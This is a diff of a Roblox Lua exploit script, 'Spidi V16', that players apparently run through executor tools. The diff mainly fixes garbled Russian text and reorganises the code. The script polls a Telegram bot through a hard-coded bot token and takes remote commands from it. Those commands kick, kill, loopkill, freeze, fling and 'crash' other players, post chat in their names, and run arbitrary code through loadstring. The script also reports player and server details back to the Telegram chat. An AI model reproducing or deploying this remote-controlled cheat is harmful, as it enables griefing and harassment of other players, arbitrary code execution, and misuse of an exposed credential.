@@ -1,11 +1,7 @@
---[=[
-  d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
- 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
- 88      88    88    88            odD'      88      88    88 88ooo88 
- 88  ooo 88    88    88          .88'        88      88    88 88~~~88 
- 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
-  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
-]=]
+-- =============================================
+-- SPIDI V16 - TELEGRAM BOT CONTROLLER
+-- Бот: @Hacker228_bot
+-- =============================================
 
 repeat wait() until game:IsLoaded()
 
@@ -13,9 +9,9 @@ local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
 local CHAT_ID = nil
 local LAST_ID = 0
 
+-- ===== ВСЕ СЕРВИСЫ =====
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
 local Lighting = game:GetService("Lighting")
@@ -27,6 +23,7 @@ local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
 
+-- ===== HTTP =====
 local function req(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
     if not f then return nil end
@@ -36,12 +33,14 @@ local function req(url, method, headers, body)
     if ok and r then return r else return nil end
 end
 
+-- ===== ОТПРАВКА В ТЕЛЕГРАМ =====
 local function send(text)
     if not CHAT_ID then return end
     local p = {chat_id = CHAT_ID, text = text, parse_mode = "HTML"}
     req("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(p))
 end
 
+-- ===== ПОЛУЧЕНИЕ CHAT_ID =====
 local function getChat()
     local r = req("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
     if r and r.Body then
@@ -54,6 +53,7 @@ local function getChat()
     return false
 end
 
+-- ===== ПЕРЕМЕННЫЕ =====
 local scriptUsers = {}
 local myPlayer = Players.LocalPlayer
 local active = {}
@@ -61,21 +61,24 @@ local stunned = {}
 local spinning = {}
 local cd = {}
 
+-- ===== ДОБАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯ =====
 local function addUser(p)
     if not scriptUsers[p.UserId] then
         scriptUsers[p.UserId] = p
-        send("рџџў <b>"..p.Name.."</b> РїРѕРґРєР»СЋС‡РёР»СЃСЏ!")
+        send("🟢 <b>"..p.Name.."</b> подключился!")
     end
 end
 
 addUser(myPlayer)
 
+-- ===== МЕТКА =====
 local m = Instance.new("BoolValue")
 m.Name = "SpidiUser"
 m.Parent = myPlayer
 
+-- ===== ПОИСК ИГРОКА =====
 local function findPlayer(inp)
-    if not inp or inp == "" then return nil, "вќЊ Р’РІРµРґРё РЅРёРє" end
+    if not inp or inp == "" then return nil, "❌ Введи ник" end
     local users = {}
     for _, p in pairs(Players:GetPlayers()) do
         if scriptUsers[p.UserId] then table.insert(users, p) end
@@ -93,10 +96,11 @@ local function findPlayer(inp)
     elseif #matches > 1 then
         local names = {}
         for _, p in pairs(matches) do table.insert(names, p.Name) end
-        return nil, "РќР°Р№РґРµРЅРѕ РЅРµСЃРєРѕР»СЊРєРѕ: "..table.concat(names, ", ")
-    else return nil, "РРіСЂРѕРє РЅРµ РЅР°Р№РґРµРЅ" end
+        return nil, "Найдено несколько: "..table.concat(names, ", ")
+    else return nil, "Игрок не найден" end
 end
 
+-- ===== ПОЛУЧЕНИЕ СПИСКОВ =====
 local function getUsers()
     local list = {}
     local i = 1
@@ -113,35 +117,29 @@ local function getAll()
     local list = {}
     local i = 1
     for _, p in pairs(Players:GetPlayers()) do
-        local hs = scriptUsers[p.UserId] and " рџ”Ґ" or ""
+        local hs = scriptUsers[p.UserId] and " 🔥" or ""
         table.insert(list, i..". "..p.Name..hs)
         i = i + 1
     end
     return list
 end
 
--- ==================== РџРћР›РќР«Р™ РЎР‘Р РћРЎ ====================
+-- ===== ПОЛНЫЙ СБРОС =====
 local function fullReset()
-    -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј РІСЃРµ Р°РєС‚РёРІРЅС‹Рµ РїСЂРѕС†РµСЃСЃС‹
     for _, d in pairs(active) do
         if d.conn then pcall(d.conn.Disconnect, d.conn) end
         if d.run then d.run = false end
     end
     active = {}
     
-    -- РћСЃС‚Р°РЅР°РІР»РёРІР°РµРј РІСЂР°С‰РµРЅРёСЏ
     for _, p in pairs(spinning) do
         p.run = false
     end
     spinning = {}
     
-    -- РЎРЅРёРјР°РµРј РѕРіР»СѓС€РµРЅРёСЏ
     stunned = {}
-    
-    -- РЎР±СЂР°СЃС‹РІР°РµРј РљР”
     cd = {}
     
-    -- Р’РѕР·РІСЂР°С‰Р°РµРј РІСЃРµС… РёРіСЂРѕРєРѕРІ РІ РЅРѕСЂРјСѓ
     for _, p in pairs(Players:GetPlayers()) do
         if p.Character then
             local hrp = p.Character:FindFirstChild("HumanoidRootPart")
@@ -157,64 +155,30 @@ local function fullReset()
                 hum.Health = 100
                 hum.MaxHealth = 100
             end
-            -- РЈРґР°Р»СЏРµРј BodyVelocity
             for _, v in pairs(p.Character:GetChildren()) do
                 if v:IsA("BodyVelocity") then v:Destroy() end
             end
         end
     end
     
-    -- РЈР±РёСЂР°РµРј Р±Р»СЋСЂ
     local blur = Lighting:FindFirstChild("SpidiWarp")
     if blur then blur:Destroy() end
     
-    -- РЈР±РёСЂР°РµРј РјСѓР·С‹РєСѓ
     local music = SoundService:FindFirstChild("ClientMusic")
     if music then
         music:Stop()
         music:Destroy()
     end
     
-    -- РЎР±СЂР°СЃС‹РІР°РµРј РєР°РјРµСЂСѓ
     local cam = Workspace.CurrentCamera
     if cam then
         cam.CameraType = Enum.CameraType.Custom
     end
     
-    send("рџ›‘ <b>РџРћР›РќР«Р™ РЎР‘Р РћРЎ!</b>\nвњ… Р’СЃРµ СЌС„С„РµРєС‚С‹ СѓР±СЂР°РЅС‹\nвњ… Р’СЃРµ РёРіСЂРѕРєРё РІРѕСЃСЃС‚Р°РЅРѕРІР»РµРЅС‹\nвњ… РџР°РјСЏС‚СЊ РѕР±РЅСѓР»РµРЅР°")
+    send("🛑 <b>ПОЛНЫЙ СБРОС!</b>\n✅ Все эффекты убраны\n✅ Все игроки восстановлены")
 end
 
--- ==================== РњРЈР—Р«РљРђ ====================
-local function playMusic(id)
-    local old = SoundService:FindFirstChild("ClientMusic")
-    if old then old:Destroy() end
-    local s = Instance.new("Sound")
-    s.Name = "ClientMusic"
-    s.SoundId = "rbxassetid://"..tostring(id)
-    s.Volume = 1
-    s.Looped = true
-    s.Parent = SoundService
-    s:Play()
-end
-
-local function stopMusic()
-    local s = SoundService:FindFirstChild("ClientMusic")
-    if s then
-        s:Stop()
-        s:Destroy()
-        return true
-    end
-    return false
-end
-
-local function canSend(p)
-    local id = p.UserId
-    local last = cd[id] or 0
-    if tick() - last < 0.3 then return false end
-    cd[id] = tick()
-    return true
-end
-
+-- ===== ЭФФЕКТЫ =====
 local function desorient(p)
     local char = p.Character
     if not char then return end
@@ -369,11 +333,43 @@ local function notify(p, text, dur)
     game:GetService("Debris"):AddItem(screen, dur)
 end
 
+-- ===== МУЗЫКА =====
+local function playMusic(id)
+    local old = SoundService:FindFirstChild("ClientMusic")
+    if old then old:Destroy() end
+    local s = Instance.new("Sound")
+    s.Name = "ClientMusic"
+    s.SoundId = "rbxassetid://"..tostring(id)
+    s.Volume = 1
+    s.Looped = true
+    s.Parent = SoundService
+    s:Play()
+end
+
+local function stopMusic()
+    local s = SoundService:FindFirstChild("ClientMusic")
+    if s then
+        s:Stop()
+        s:Destroy()
+        return true
+    end
+    return false
+end
+
+local function canSend(p)
+    local id = p.UserId
+    local last = cd[id] or 0
+    if tick() - last < 0.3 then return false end
+    cd[id] = tick()
+    return true
+end
+
+-- ===== ОБРАБОТКА КОМАНД =====
 local function handle(cmd, args)
-    local info = "рџ‘¤ Hacker228\nрџ”— https://www.roblox.com/games/"..game.PlaceId
+    local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        send("вњ… Spidi v16 Р°РєС‚РёРІРёСЂРѕРІР°РЅ!\n"..info)
+        send("✅ Spidi v16 активирован!\n"..info)
         return
     end
     
@@ -383,19 +379,19 @@ local function handle(cmd, args)
     end
     
     if cmd == "help" then
-        send("рџ“‹ <b>РљРћРњРђРќР”Р«:</b>\n/players - РїРѕР»СЊР·РѕРІР°С‚РµР»Рё\n/pc - РІСЃРµ РёРіСЂРѕРєРё\n/rm - РїРѕР»РЅС‹Р№ СЃР±СЂРѕСЃ\n/kick [РЅРёРє] [РїСЂРёС‡РёРЅР°]\n/ban [РЅРёРє] [РїСЂРёС‡РёРЅР°]\n/unban [РЅРёРє]\n/kill [РЅРёРє]\n/freeze [РЅРёРє]\n/unfreeze [РЅРёРє]\n/fly [РЅРёРє]\n/unfly [РЅРёРє]\n/crash [РЅРёРє]\n/fling [РЅРёРє]\n/teleport [РЅРёРє1] [РЅРёРє2]\n/bring [РЅРёРє1] [РЅРёРє2]\n/loopkill [РЅРёРє]\n/stun [РЅРёРє]\n/jump [РЅРёРє]\n/spin [РЅРёРє] [СЃРєРѕСЂРѕСЃС‚СЊ]\n/unspin [РЅРёРє]\n/explode [РЅРёРє]\n/des [РЅРёРє]\n/warp [РЅРёРє] [1-10]\n/unwarp [РЅРёРє]\n/music [Р°Р№РґРё]\n/unmusic\n/say [РЅРёРє] [С‚РµРєСЃС‚]\n/spam [РЅРёРє] [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]\n/message [РЅРёРє] [С‚РµРєСЃС‚]\n/announce [С‚РµРєСЃС‚]\n/players\n/pc\n/server\n/execute [РєРѕРґ]\n/setfps\n/help")
+        send("📋 <b>КОМАНДЫ:</b>\n/players - пользователи\n/pc - все игроки\n/rm - полный сброс\n/kick [ник] [причина]\n/ban [ник] [причина]\n/unban [ник]\n/kill [ник]\n/freeze [ник]\n/unfreeze [ник]\n/fly [ник]\n/unfly [ник]\n/crash [ник]\n/fling [ник]\n/teleport [ник1] [ник2]\n/bring [ник1] [ник2]\n/loopkill [ник]\n/stun [ник]\n/jump [ник]\n/spin [ник] [скорость]\n/unspin [ник]\n/explode [ник]\n/des [ник]\n/warp [ник] [1-10]\n/unwarp [ник]\n/music [айди]\n/unmusic\n/say [ник] [текст]\n/spam [ник] [кол-во] [текст]\n/message [ник] [текст]\n/announce [текст]\n/players\n/pc\n/server\n/execute [код]\n/setfps\n/help")
         return
     end
     
     if cmd == "players" then
         local list = getUsers()
-        if #list == 0 then send("рџ‘Ґ РџРѕР»СЊР·РѕРІР°С‚РµР»РµР№: 0") else send("рџ‘Ґ <b>РџРѕР»СЊР·РѕРІР°С‚РµР»Рё:</b>\n"..table.concat(list, "\n")) end
+        if #list == 0 then send("👥 Пользователей: 0") else send("👥 <b>Пользователи:</b>\n"..table.concat(list, "\n")) end
         return
     end
     
     if cmd == "pc" then
         local list = getAll()
-        if #list == 0 then send("рџ‘Ґ РРіСЂРѕРєРѕРІ: 0") else send("рџ‘Ґ <b>Р’СЃРµ РёРіСЂРѕРєРё:</b>\n"..table.concat(list, "\n").."\n\nрџ”Ґ - Spidi") end
+        if #list == 0 then send("👥 Игроков: 0") else send("👥 <b>Все игроки:</b>\n"..table.concat(list, "\n").."\n\n🔥 - Spidi") end
         return
     end
     
@@ -403,55 +399,55 @@ local function handle(cmd, args)
         local name = MarketplaceService:GetProductInfo(game.PlaceId).Name
         local count = 0
         for _, p in pairs(Players:GetPlayers()) do if scriptUsers[p.UserId] then count = count + 1 end end
-        send("рџ–ҐпёЏ РЎРµСЂРІРµСЂ: "..name.."\nID: "..game.PlaceId.."\nРРіСЂРѕРєРѕРІ: "..#Players:GetPlayers().."\nSpidi: "..count)
+        send("🖥️ Сервер: "..name.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nSpidi: "..count)
         return
     end
     
     if cmd == "setfps" then
         local state = toggleFps()
-        send("рџЋ® FPS: "..(state and "10" or "60"))
+        send("🎮 FPS: "..(state and "10" or "60"))
         return
     end
     
     if cmd == "execute" then
         local code = table.concat(args, " ", 1)
-        if code == "" then send("вќЊ /execute РєРѕРґ") return end
-        send("вЏі Р’С‹РїРѕР»РЅРµРЅРёРµ...")
+        if code == "" then send("❌ /execute код") return end
+        send("⏳ Выполнение...")
         local ok, res = pcall(loadstring, code)
-        if ok then send("вњ… РљРѕРґ РІС‹РїРѕР»РЅРµРЅ\n"..info) else send("вќЊ РћС€РёР±РєР°: "..tostring(res)) end
+        if ok then send("✅ Код выполнен\n"..info) else send("❌ Ошибка: "..tostring(res)) end
         return
     end
     
     if cmd == "music" then
         local id = args[1]
-        if not id then send("вќЊ /music [Р°Р№РґРё]") return end
+        if not id then send("❌ /music [айди]") return end
         playMusic(id)
-        send("рџЋµ РњСѓР·С‹РєР° РІРєР»СЋС‡РµРЅР°! ID: "..id)
+        send("🎵 Музыка включена! ID: "..id)
         return
     end
     
     if cmd == "unmusic" then
-        if stopMusic() then send("рџ”‡ РњСѓР·С‹РєР° РІС‹РєР»СЋС‡РµРЅР°!") else send("вќЊ РњСѓР·С‹РєР° РЅРµ РёРіСЂР°РµС‚") end
+        if stopMusic() then send("🔇 Музыка выключена!") else send("❌ Музыка не играет") end
         return
     end
     
     if cmd == "announce" then
         local msg = table.concat(args, " ", 1)
-        if msg == "" then send("вќЊ /announce [С‚РµРєСЃС‚]") return end
+        if msg == "" then send("❌ /announce [текст]") return end
         StarterGui:SetCore("SendNotification", {Title = "", Text = msg, Duration = 10, Icon = ""})
-        send("вњ… РћР±СЉСЏРІР»РµРЅРёРµ: "..msg)
+        send("✅ Объявление: "..msg)
         return
     end
     
     if cmd == "say" then
         local name = args[1]
         local msg = table.concat(args, " ", 2)
-        if not name then send("вќЊ /say [РЅРёРє] [С‚РµРєСЃС‚]") return end
-        if msg == "" then send("вќЊ Р’РІРµРґРё С‚РµРєСЃС‚") return end
+        if not name then send("❌ /say [ник] [текст]") return end
+        if msg == "" then send("❌ Введи текст") return end
         local target, err = findPlayer(name)
-        if not target then send("вќЊ "..err) return end
+        if not target then send("❌ "..err) return end
         say(target, msg)
-        send("вњ… РЎРєР°Р·Р°РЅРѕ РѕС‚ <b>"..target.Name.."</b>: "..msg)
+        send("✅ Сказано от <b>"..target.Name.."</b>: "..msg)
         return
     end
     
@@ -459,60 +455,61 @@ local function handle(cmd, args)
         local name = args[1]
         local count = tonumber(args[2]) or 5
         local msg = table.concat(args, " ", 3)
-        if not name then send("вќЊ /spam [РЅРёРє] [РєРѕР»-РІРѕ] [С‚РµРєСЃС‚]") return end
-        if msg == "" then send("вќЊ Р’РІРµРґРё С‚РµРєСЃС‚") return end
+        if not name then send("❌ /spam [ник] [кол-во] [текст]") return end
+        if msg == "" then send("❌ Введи текст") return end
         local target, err = findPlayer(name)
-        if not target then send("вќЊ "..err) return end
+        if not target then send("❌ "..err) return end
         for i = 1, math.min(count, 20) do
             task.wait(0.1)
             say(target, msg.." "..i)
         end
-        send("вњ… РЎРїР°Рј РѕС‚ <b>"..target.Name.."</b> ("..math.min(count,20).." СЂР°Р·)")
+        send("✅ Спам от <b>"..target.Name.."</b> ("..math.min(count,20).." раз)")
         return
     end
     
     if cmd == "message" then
         local name = args[1]
         local msg = table.concat(args, " ", 2)
-        if not name then send("вќЊ /message [РЅРёРє] [С‚РµРєСЃС‚]") return end
-        if msg == "" then send("вќЊ Р’РІРµРґРё С‚РµРєСЃС‚") return end
+        if not name then send("❌ /message [ник] [текст]") return end
+        if msg == "" then send("❌ Введи текст") return end
         local target, err = findPlayer(name)
-        if not target then send("вќЊ "..err) return end
-        if not canSend(target) then send("вЏі РџРѕРґРѕР¶РґРё 0.3 СЃРµРє") return end
+        if not target then send("❌ "..err) return end
+        if not canSend(target) then send("⏳ Подожди 0.3 сек") return end
         notify(target, msg, 5)
-        send("вњ… РЎРѕРѕР±С‰РµРЅРёРµ <b>"..target.Name.."</b>: "..msg)
+        send("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
         return
     end
     
     if cmd == "teleport" or cmd == "bring" then
         local n1 = args[1]
         local n2 = args[2]
-        if not n1 or not n2 then send("вќЊ /"..cmd.." [РЅРёРє1] [РЅРёРє2]") return end
+        if not n1 or not n2 then send("❌ /"..cmd.." [ник1] [ник2]") return end
         local t1, e1 = findPlayer(n1)
-        if not t1 then send("вќЊ "..e1) return end
+        if not t1 then send("❌ "..e1) return end
         local t2, e2 = findPlayer(n2)
-        if not t2 then send("вќЊ "..e2) return end
+        if not t2 then send("❌ "..e2) return end
         local h1 = t1.Character and t1.Character:FindFirstChild("HumanoidRootPart")
         local h2 = t2.Character and t2.Character:FindFirstChild("HumanoidRootPart")
-        if not h1 or not h2 then send("вќЊ РќРµС‚ РїРµСЂСЃРѕРЅР°Р¶Р°") return end
+        if not h1 or not h2 then send("❌ Нет персонажа") return end
         if cmd == "teleport" then
             h1.CFrame = h2.CFrame + Vector3.new(0,3,0)
-            send("рџ“Ќ <b>"..t1.Name.."</b> Рє <b>"..t2.Name.."</b>")
+            send("📍 <b>"..t1.Name.."</b> к <b>"..t2.Name.."</b>")
         else
             h2.CFrame = h1.CFrame + Vector3.new(0,3,0)
-            send("рџ“Ќ <b>"..t2.Name.."</b> Рє <b>"..t1.Name.."</b>")
+            send("📍 <b>"..t2.Name.."</b> к <b>"..t1.Name.."</b>")
         end
         return
     end
     
+    -- ===== КОМАНДЫ С ЦЕЛЬЮ =====
     local name = args[1]
-    if not name then send("вќЊ РЈРєР°Р¶Рё РЅРёРє") return end
+    if not name then send("❌ Укажи ник") return end
     local target, err = findPlayer(name)
-    if not target then send("вќЊ "..err) return end
+    if not target then send("❌ "..err) return end
     
     if target == myPlayer then
         if cmd == "kick" or cmd == "ban" then
-            send("вќЊ РќРµР»СЊР·СЏ РєРёРєРЅСѓС‚СЊ/Р·Р°Р±Р°РЅРёС‚СЊ СЃРµР±СЏ!")
+            send("❌ Нельзя кикнуть/забанить себя!")
             return
         end
     end
@@ -524,26 +521,26 @@ local function handle(cmd, args)
     if cmd == "kick" then
         local reason = table.concat(args, " ", 2)
         if reason == "" or reason == name then target:Kick("Kicked by Spidi") else target:Kick(reason) end
-        send("вњ… РљРёРєРЅСѓС‚: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (РџСЂРёС‡РёРЅР°: "..reason..")" or ""))
+        send("✅ Кикнут: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
         return
     end
     
     if cmd == "ban" then
         local reason = table.concat(args, " ", 2)
         if reason == "" or reason == name then target:Kick("Banned by Spidi") else target:Kick(reason) end
-        send("вњ… Р—Р°Р±Р°РЅРµРЅ: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (РџСЂРёС‡РёРЅР°: "..reason..")" or ""))
+        send("✅ Забанен: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
         return
     end
     
     if cmd == "unban" then
         target:Kick("Unbanned by Spidi")
-        send("вњ… Р Р°Р·Р±Р°РЅРµРЅ: <b>"..target.Name.."</b>")
+        send("✅ Разбанен: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "kill" and hum then
         hum.Health = 0
-        send("рџ’Ђ РЈР±РёС‚: <b>"..target.Name.."</b>")
+        send("💀 Убит: <b>"..target.Name.."</b>")
         return
     end
     
@@ -551,7 +548,7 @@ local function handle(cmd, args)
         hrp.Anchored = true
         hum.WalkSpeed = 0
         hum.JumpPower = 0
-        send("рџ§Љ Р—Р°РјРѕСЂРѕР¶РµРЅ: <b>"..target.Name.."</b>")
+        send("🧊 Заморожен: <b>"..target.Name.."</b>")
         return
     end
     
@@ -559,7 +556,7 @@ local function handle(cmd, args)
         hrp.Anchored = false
         hum.WalkSpeed = 16
         hum.JumpPower = 50
-        send("рџ”Ґ Р Р°Р·РјРѕСЂРѕР¶РµРЅ: <b>"..target.Name.."</b>")
+        send("🔥 Разморожен: <b>"..target.Name.."</b>")
         return
     end
     
@@ -569,13 +566,13 @@ local function handle(cmd, args)
         bv.Velocity = Vector3.new(0,50,0)
         bv.Parent = hrp
         Debris:AddItem(bv,5)
-        send("вњ€пёЏ РџРѕР»РµС‚РµР»: <b>"..target.Name.."</b>")
+        send("✈️ Полетел: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "unfly" and hrp then
         for _, v in pairs(hrp:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
-        send("рџ›‘ РћС‚РєР»СЋС‡РµРЅ РїРѕР»РµС‚: <b>"..target.Name.."</b>")
+        send("🛑 Отключен полет: <b>"..target.Name.."</b>")
         return
     end
     
@@ -589,13 +586,13 @@ local function handle(cmd, args)
             p.Parent = Workspace
             Debris:AddItem(p,2)
         end
-        send("рџ’Ґ РљСЂР°С€РЅСѓС‚: <b>"..target.Name.."</b>")
+        send("💥 Крашнут: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "fling" then
         fling(target)
-        send("рџЊЂ Р¤Р»РёРЅРі РЅР° <b>"..target.Name.."</b>")
+        send("🌀 Флинг на <b>"..target.Name.."</b>")
         return
     end
     
@@ -608,19 +605,19 @@ local function handle(cmd, args)
                 task.wait(0.5)
             end
         end)
-        send("рџ”„ Loopkill РЅР° <b>"..target.Name.."</b>")
+        send("🔁 Loopkill на <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "stun" and hum then
         stun(target)
-        send("вљЎ РћРіР»СѓС€РµРЅ РЅР° 3 СЃРµРє: <b>"..target.Name.."</b>")
+        send("⚡ Оглушен на 3 сек: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "jump" and hum then
         hum.Jump = true
-        send("рџ¦ РџСЂС‹Р¶РѕРє: <b>"..target.Name.."</b>")
+        send("🦘 Прыжок: <b>"..target.Name.."</b>")
         return
     end
     
@@ -628,15 +625,15 @@ local function handle(cmd, args)
         local speed = tonumber(args[2]) or 1
         speed = math.clamp(speed, 0.5, 10)
         if spin(target, speed) then
-            send("рџ”„ Р’СЂР°С‰РµРЅРёРµ ("..speed.."x): <b>"..target.Name.."</b>")
+            send("🔄 Вращение ("..speed.."x): <b>"..target.Name.."</b>")
         else
-            send("вќЊ РќРµС‚ РїРµСЂСЃРѕРЅР°Р¶Р°")
+            send("❌ Нет персонажа")
         end
         return
     end
     
     if cmd == "unspin" then
-        if unspin(target) then send("вњ… РћСЃС‚Р°РЅРѕРІР»РµРЅРѕ: <b>"..target.Name.."</b>") else send("вќЊ Р’СЂР°С‰РµРЅРёРµ РЅРµ Р°РєС‚РёРІРЅРѕ") end
+        if unspin(target) then send("✅ Остановлено: <b>"..target.Name.."</b>") else send("❌ Вращение не активно") end
         return
     end
     
@@ -652,13 +649,13 @@ local function handle(cmd, args)
             p.Parent = Workspace
             Debris:AddItem(p,1)
         end
-        send("рџ’Ґ Р’Р·СЂС‹РІ: <b>"..target.Name.."</b>")
+        send("💥 Взрыв: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "des" then
         desorient(target)
-        send("рџЊЂ Р”РµР·РѕСЂРёРµРЅС‚Р°С†РёСЏ (3 СЃРµРє): <b>"..target.Name.."</b>")
+        send("🌀 Дезориентация (3 сек): <b>"..target.Name.."</b>")
         return
     end
     
@@ -672,7 +669,7 @@ local function handle(cmd, args)
             blur.Parent = Lighting
         end
         blur.Size = level * 3
-        send("рџЊЂ Р Р°Р·РјС‹С‚РёРµ "..level.."/10 РЅР° <b>"..target.Name.."</b>")
+        send("🌊 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
         return
     end
     
@@ -680,16 +677,17 @@ local function handle(cmd, args)
         local blur = Lighting:FindFirstChild("SpidiWarp")
         if blur then
             blur:Destroy()
-            send("вњ… Р Р°Р·РјС‹С‚РёРµ СѓР±СЂР°РЅРѕ Сѓ <b>"..target.Name.."</b>")
+            send("✅ Размытие убрано у <b>"..target.Name.."</b>")
         else
-            send("вќЊ РќРµС‚ СЂР°Р·РјС‹С‚РёСЏ Сѓ <b>"..target.Name.."</b>")
+            send("❌ Нет размытия у <b>"..target.Name.."</b>")
         end
         return
     end
     
-    send("вќЊ РќРµРёР·РІРµСЃС‚РЅР°СЏ РєРѕРјР°РЅРґР°. /help")
+    send("❌ Неизвестная команда. /help")
 end
 
+-- ===== ФОНОВЫЕ ПРОЦЕССЫ =====
 local oldPlayers = {}
 local function checkNew()
     for _, p in pairs(Players:GetPlayers()) do
@@ -719,7 +717,7 @@ local function poll()
                     local msg = upd.message
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        send("вњ… Spidi v16 Р·Р°РїСѓС‰РµРЅ!\nрџ‘¤ Hacker228")
+                        send("✅ Spidi v16 запущен!\n👤 Hacker228")
                     end
                     local text = msg.text
                     if text:sub(1,1) == "/" then
@@ -743,8 +741,9 @@ spawn(function()
     end
 end)
 
+-- ===== СТАРТ =====
 wait(3)
 getChat()
 if CHAT_ID then
-    send("вњ… Spidi v16 Р·Р°РїСѓС‰РµРЅ!\nрџ‘¤ Hacker228\n/players - РїРѕР»СЊР·РѕРІР°С‚РµР»Рё\n/pc - РІСЃРµ РёРіСЂРѕРєРё\n/rm - РїРѕР»РЅС‹Р№ СЃР±СЂРѕСЃ")
+    send("✅ Spidi v16 запущен!\n👤 Hacker228\n/players - пользователи\n/pc - все игроки\n/rm - полный сброс")
 end
